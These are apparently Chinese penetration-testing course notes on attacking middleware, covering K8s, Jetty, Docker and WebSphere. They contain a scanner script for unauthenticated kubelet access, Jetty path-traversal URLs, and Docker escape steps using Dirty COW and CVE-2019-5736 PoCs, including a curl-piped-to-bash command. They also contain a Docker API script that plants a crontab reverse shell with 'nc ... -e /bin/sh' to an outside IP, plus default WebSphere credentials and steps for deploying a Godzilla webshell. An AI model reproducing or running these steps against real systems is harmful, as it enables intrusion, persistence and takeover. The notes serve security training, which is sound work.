![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134731602-1337681029.png)

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134743675-124879155.png)

```plain
#知识点：
中间件及框架列表：
IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等
0、中间件-K8s安全
1、中间件-Jetty安全
2、中间件-Docker安全
3、中间件-WebSphere安全

#章节内容：
常见中间件的安全测试：
1、配置不当-解析&弱口令
2、安全机制-特定安全漏洞
3、安全机制-弱口令爆破攻击
4、安全应用-框架特定安全漏洞

#前置知识：
中间件安全测试流程：
1、判断中间件信息-名称&版本&三方
2、判断中间件问题-配置不当&公开漏洞
3、判断中间件利用-弱口令&EXP&框架漏洞

应用服务安全测试流程：见图
1、判断服务开放情况-端口扫描&组合应用等
2、判断服务类型归属-数据库&文件传输&通讯等
3、判断服务利用方式-特定漏洞&未授权&弱口令等
```

- 中间件-K8s-搜哈

```plain
kubernetes简称 k8s，是一个由google开源的，用于自动部署，扩展和管理容器化应用程序的开源系统。在B站内部，k8s在管理生产级容器和应用服务部署已经有较为广泛和成熟的应用。通过k8s，可跨多台主机进行容器编排、快速按需扩展容器化应用及其资源、对应用实施状况检查、服务发现和负载均衡等。
参考：https://blog.csdn.net/w1590191166/article/details/122028001
怎么判定是不是k8s
组件：组件会出现一些默认端口。如果有一些默认的端口，就能判定是k8s
（1）kube-apiserver：k8s master节点api服务器，以REST API服务形式提供接口，作为整个k8s的控制入口。
（2）kube-controller-manager：执行整个k8s的后台任务，包括节点状态状况、Pod个数、Pods和Service的关联等。
（3）kube-scheduler：接收来自kube-apiserver创建Pods任务，通过收集的集群中所有node节点的资源负载情况分配到某个节点。
（4）etcd：k8s的键值对形式数据库,保存了k8s所有集群数据的后台数据库
（5）kube-proxy：运行在每个node节点上，负责pod网络代理。定时从etcd获取到service信息来做相应的策略。
（6）kubelet：运行在每个node节点上，作为agent，接收分配该节点的pods任务及管理容器，周期性获取容器状态，反馈给kube-apiserver。


kube-apiserver开放端口：8080
kubelet开放端口：10250
etcd开放端口：2379
dashboard开放端口：80
docker开放端口：2376
kube-proxy开放端口：8001
安全问题：
1.未授权访问（配置导致的问题）
2.提权漏洞（在提权章节会讲）
https://blog.csdn.net/u012206617/article/details/120178354

搜素语法："kubernetes" && port="10250"
可以写py脚本去进行测试。
import requests

for url in open('urls.txt'):
	url=url.strip()+'/pods'
	print(url)
	try:
		result=requests.get(url,verify=False).txt
		if 'Unauthorized' not in result:
			print('+|'+url)
	except Exception as e:
		pass
```

- 中间件-Jetty-搜哈

```plain
Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。
访问路径来获取文件内容，同一个漏洞，知识修复后再次被利用。
环境：http://vulfocus.io/#/dashboard

CVE-2021-28164
http://123.58.236.76:63126/%2e/WEB-INF/web.xml
CVE-2021-28169
http://123.58.236.76:63126/static?/WEB-INF/web.xml
CVE-2021-34429
http://123.58.236.76:63126/%u002e/WEB-INF/web.xml
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812129-716852327.png)

- 中间件-Docker-搜哈

```plain
Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP，就可以返回一个宿主机的高权限Shell，并拿到宿主机的root权限，可以直接操作宿主机文件。 它从容器中逃了出来，因此我们形象的称为Docker逃逸漏洞。

权限对比：
1.docker启动的web Nginx环境
在真机上找不到相对应的目录，相当于虚拟机。

2.常规Nginx启动的web环境
和正常的环境的目录，文件等各自一致，真实存在的。权限也是一样的。
启动docker搭建的Nginx环境：
cd vulhub-master/nginx/nginx_parsing_vulnerability/
sudo docker-compose up -d

访问：http://192.168.233.128/
然后进行权限分析。
```

容器判断

```plain
-是否存在.dockerenv文件
ls -alh /.dockerenv

-查询系统进程的cgroup信息：
cat /proc/1/cgroup

真实机执行命令
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812242-1988640787.png)

```plain
docker环境执行命令
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812672-100292214.png)

容器逃逸漏洞

```plain
权限提升，逃逸的可能性，引起漏洞成因：
1.由内核漏洞引起 ——Dirty COW(CVE-2016-5195)
2.由 Docker 软件设计引起——CVE-2019-5736、CVE-2019-14271，CVE-2020-15257
3.由配置不当引起——开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能（capabilities）机制、sock通信方式
-CVE-2016-5195
https://github.com/gebl/dirtycow-docker-vdso
https://www.ichunqiu.com/experiment/catalog?id=100295
# 使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test
# 其中 test：为临时名称，可以自定义填写。 -p： 第一个端口为本机的端口，第二个端口为Docker的端口。 -itd：意思是在后台运行，交互式运行，并且输出当前的信息 /bin/bash：调用Shell
1.启动docker
docker run --name=test -p 1234:1234 -itd dirtycow /bin/bash 
2.进入镜像内部
docker exec -it test /bin/bash
3.编译并运行POC
cd /dirtycow-vdso/  
make 
./0xdeadbeef   



查看镜像：docker images

在docker中创建文件，不会影响真机上的文件。如果进行了docker逃逸，那就会影响到真机的文件。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812463-272010547.png)

```plain
-CVE-2019-5736
参考：https://blog.51cto.com/u_15060465/4336524
复现：curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh && bash install.sh
1、下载POC
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
2、修改编译生成payload
CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build main.go
3.将该payload拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸） 并执行
docker cp main ecca872da49d:/home
docker exec -it ecca872da49d bash
cd /home/
chmod 777 main
./main
4、再次进入docker镜像后监听即可收到
docker exec -it 镜像ID bash
nc -lvvp
```

容器安全漏洞

```plain
docker未授权访问漏洞-vulhub-exp.py
可以直接用脚本去跑，那就可以得到权限
语法："docker" && port="2375"

启动环境：
cd /vulhub-master/docker/unauthorized-rce
sudo docker-compose up -d

python脚本：
import docker
client = docker.DockerClient(base_url='http://192.168.233.128:2375/')
data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc 175.178.151.29 5566 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})



安装docker：G:\python38\Scripts\pip.exe install docker
执行：G:\python38\python.exe docker-api.py

但是启动环境失败了。
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812419-189249474.png)

- 中间件-WebSphere-搜哈

```plain
WebSphere® Application Server 加速交付新应用程序和服务，它可以通过快速交付创新的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰 富的编程模型中进行选择，以便更好地协调项目需求与编程模型功能和开发人员技能。
端口：9080—web(http)应用访问端口、9443—web(https)应用访问端口、9060—管理后台访问端口、9043—管理控制台安全端口、8880—SOAP连接器端口等等。
漏洞探测在8880端口，后台是9060端口，解析是9080端口
需要自己搭建：
拉取镜像：docker pull iscrosales/websphere7
启动镜像：docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
停止镜像：docker stop $(docker ps -aq)
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812634-36529441.png)

```plain
1、CVE-2015-7450 反序列化
工具搜哈：http://175.178.151.29:8880/
用到集成化工具：java反序列化终极检测工具
搜索语法："websphere" && server=="WebSphere Application Server/6.1"
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812751-285822198.png)

```plain
2、弱口令 上传拿Shell
-在6.x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。
弱口令：
-websphere/ websphere
-system/ manager

访问：http://175.178.151.29:9060/ibm/console
登录：admin（默认账号）
上传：war马(用哥斯拉生成后门，jsp后门)

点击applications下的application types 在点击websphere enterprise applications，在这里页面中点击install
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812772-1195259825.png)

```plain
然后上传一个war包，用哥斯拉生成，上传一直点击下一步
```

![image.png](https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913134812905-218813651.png)

```plain
到选择路径的时候，就选择1，点击保存就可以了。

启动1.war，也是在当前页面，选择1.war 然后点击start运行起来就可以。
访问连接：http://175.178.151.29:9080/1/1.jsp
3、CVE-2020-4450：无利用POC/EXP
无法复现。
```